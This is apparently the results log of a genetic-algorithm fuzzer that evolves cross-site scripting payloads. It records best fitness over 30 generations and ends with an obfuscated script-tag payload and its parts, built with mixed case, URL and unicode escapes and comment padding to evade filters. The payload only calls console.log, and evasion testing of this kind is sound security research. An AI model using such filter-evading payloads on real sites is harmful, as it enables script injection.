generation,best_fitness
0,31.750824572253144
1,31.300824572253145
2,31.750824572253144
3,32.01332457225315
4,32.01332457225315
5,32.72440947791352
6,33.54565215846004
7,33.54565215846004
8,33.54565215846004
9,33.54565215846004
10,33.54565215846004
11,33.54565215846004
12,33.69828219937179
13,33.96218820861678
14,33.96218820861678
15,33.96218820861678
16,33.96218820861678
17,34.09855184498041
18,34.854050378704756
19,34.854050378704756
20,34.854050378704756
21,35.60898783755926
22,35.60898783755926
23,35.60898783755926
24,35.60898783755926
25,35.60898783755926
26,35.60898783755926
27,35.63960008245723
28,35.63960008245723
29,35.79021851164708

best_components,"['<script', 'oncl%2F%2A%20%2A%2Fick%3D', 'CoNsoLe\\u/002ELOG%2\\U002F*\\U0020*/8\\U0031%\\u00329COnSoLE.LoG%281%\\U00329/*x*//*x*/']"
best_payload,<script>CoNsoLe\u/002ELOG%2\U002F*\U0020*/8\U0031%\u00329COnSoLE.LoG%281%\U00329/*x*//*x*/</script>
total_time_sec,90.369384765625
